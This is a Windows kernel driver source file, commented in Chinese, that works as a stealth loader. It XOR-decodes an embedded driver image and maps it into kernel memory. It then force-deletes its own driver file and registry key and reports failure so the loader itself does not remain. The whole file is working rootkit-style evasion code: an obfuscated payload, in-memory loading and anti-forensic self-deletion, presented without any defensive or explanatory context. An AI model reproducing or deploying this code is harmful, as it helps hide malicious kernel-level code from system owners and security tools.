#include "DrvLoader.h"
#include "Unrevealed.h"
#include "utils.h"
#include "dll.h"

VOID DriverUnLoad(PDRIVER_OBJECT driver)
{
	UNREFERENCED_PARAMETER(driver);

	KdPrint((" --- DriverUnLoad --- \r\n"));
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING regPath)
{
	UNREFERENCED_PARAMETER(regPath);
	KdPrint((" --- DriverEntry --- \r\n"));

	// 内存加载驱动
	ULONG dwImageSize = sizeof(sysData);
	unsigned char * fileBuffer = (unsigned char *)ExAllocatePool(NonPagedPool,dwImageSize);
	if (fileBuffer)
	{
		memcpy(fileBuffer, sysData, dwImageSize);
		for (ULONG i = 0; i < dwImageSize; i++)
		{
			fileBuffer[i] ^= XOR_ENCODE_KEY;
		}
		LoadDriver(fileBuffer);
		ExFreePool(fileBuffer);
	}

	// 删除当前驱动文件和注册表配置
	PKLDR_DATA_TABLE_ENTRY64 ldr = (PKLDR_DATA_TABLE_ENTRY64)driver->DriverSection;
	if (ldr)
	{
		driver->DriverUnload = DriverUnLoad;
		RtlForceDeleteFile(ldr->FullDllName.Buffer);
	}
	RtlDeleteDrvRegPath(regPath);

	// 这加载器驱动不让其运行
	return STATUS_UNSUCCESSFUL;
}